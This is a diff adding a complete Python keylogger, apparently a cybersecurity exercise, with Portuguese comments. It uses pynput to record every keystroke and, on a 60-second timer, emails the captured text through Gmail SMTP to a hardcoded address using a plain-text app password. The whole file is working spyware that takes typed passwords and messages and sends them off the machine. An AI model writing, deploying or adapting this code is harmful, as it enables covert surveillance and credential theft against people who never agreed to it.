@@ -1,0 +1,64 @@
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+log = ""
+
+# Configurações de email
+EMAIL_ORIGEM = "teste.cybrsct1@gmail.com"
+EMAIL_DESTINO = "teste.cybrsct1@gmail.com"
+SENHA_EMAIL = "gqga papx vkeh uqpt"
+
+def enviar_email():
+    global log
+    
+    # Reinicia o timer para rodar esta função novamente em 60 segundos
+    Timer(60, enviar_email).start()
+
+    # Só executa o envio se houver algo gravado no log
+    if log:
+        msg = MIMEText(log)
+        msg['Subject'] = 'Dados capturados'
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg) # Corrigido de sendmensage para send_message
+            server.quit()
+            print("Email enviado com sucesso!")
+            
+            # Limpa o log apenas após enviar (ou tentar)
+            log = "" 
+        except Exception as e:
+            print(f"Erro ao enviar email: {e}")
+
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.tab:
+            log += "[TAB]"
+        elif key == keyboard.Key.backspace:
+            # Opcional: remover o último caractere em vez de escrever [BACKSPACE]
+            # log = log[:-1] 
+            log += "[BACKSPACE]"
+        elif key == keyboard.Key.esc:
+            log += "[ESC]"
+        else:
+            pass # Ignora ctrl, shift, alt, etc.
+
+# Iniciar o listener e o loop de envio
+# Chamamos enviar_email() uma vez para iniciar o timer
+enviar_email()
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
